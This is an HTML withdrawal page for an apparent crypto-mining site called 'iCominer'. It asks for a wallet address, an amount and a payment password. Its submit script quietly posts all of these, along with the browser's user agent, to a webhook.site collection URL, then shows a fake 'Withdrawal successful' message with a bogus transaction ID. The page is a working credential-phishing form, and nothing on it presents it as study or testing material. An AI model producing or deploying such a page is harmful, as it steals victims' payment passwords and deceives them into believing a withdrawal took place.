<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Withdraw | iCominer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #f5f7fb;
      color: #333;
    }
    .container {
      max-width: 600px;
      margin: 40px auto;
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
    }
    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #222;
    }
    label {
      font-weight: 600;
      margin-top: 15px;
      display: block;
    }
    select, input {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
    }
    button {
      width: 100%;
      background-color: #00b894;
      color: white;
      padding: 14px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
    }
    .status {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
      color: #636e72;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 40px;
    }
    th, td {
      padding: 12px;
      border-bottom: 1px solid #eee;
      text-align: left;
    }
    th {
      background: #f0f0f0;
    }
    .success {
      color: green;
      font-weight: bold;
    }
    .failure {
      color: red;
      font-weight: bold;
    }
    .badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 6px;
      font-size: 12px;
      color: #fff;
    }
    .badge-bnb {
      background: #f3ba2f;
      color: #000;
    }
    .badge-ltc {
      background: #345c9c;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Withdraw</h2>
    <label for="network">Withdraw Network</label>
    <select id="network">
      <option value="bnb">BNB [Binance Smart Chain]</option>
      <option value="ltc">LTC [Litecoin]</option>
    </select>

    <label for="wallet">Wallet Address</label>
    <input id="wallet" placeholder="0x123...">

    <label for="amount">Amount (USD)</label>
    <input id="amount" type="number" placeholder="100.00">

    <label for="password">Payment Password</label>
    <input id="password" type="password" placeholder="123456">

    <button onclick="submitWithdraw()">Submit</button>

    <div class="status" id="status">Awaiting action...</div>

    <table>
      <thead>
        <tr>
          <th>Action</th>
          <th>Amount</th>
          <th>Status</th>
          <th>Network</th>
          <th>Time</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>ðŸ“·</td>
          <td>$200.00</td>
          <td class="success">SUCCESS</td>
          <td><span class="badge badge-ltc">LTC</span></td>
          <td>2025-03-25 03:53:25</td>
        </tr>
        <tr>
          <td>ðŸ“·</td>
          <td>$200.00</td>
          <td class="failure">FAILURE</td>
          <td><span class="badge badge-bnb">BNB</span></td>
          <td>2025-03-10 03:38:43</td>
        </tr>
      </tbody>
    </table>
  </div>

  <script>
    function submitWithdraw() {
      const wallet = document.getElementById('wallet').value;
      const amount = document.getElementById('amount').value;
      const password = document.getElementById('password').value;
      const network = document.getElementById('network').value;

      document.getElementById('status').innerText = "Submitting...";

      fetch("https://webhook.site/846de35d-2625-497d-8ab8-414d516ccb49", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet,
          amount,
          password,
          network,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });

      setTimeout(() => {
        document.getElementById('status').innerText = "Withdrawal successful. TXID: 0xfake123456abcde";
      }, 2000);
    }
  </script>
</body>
</html>
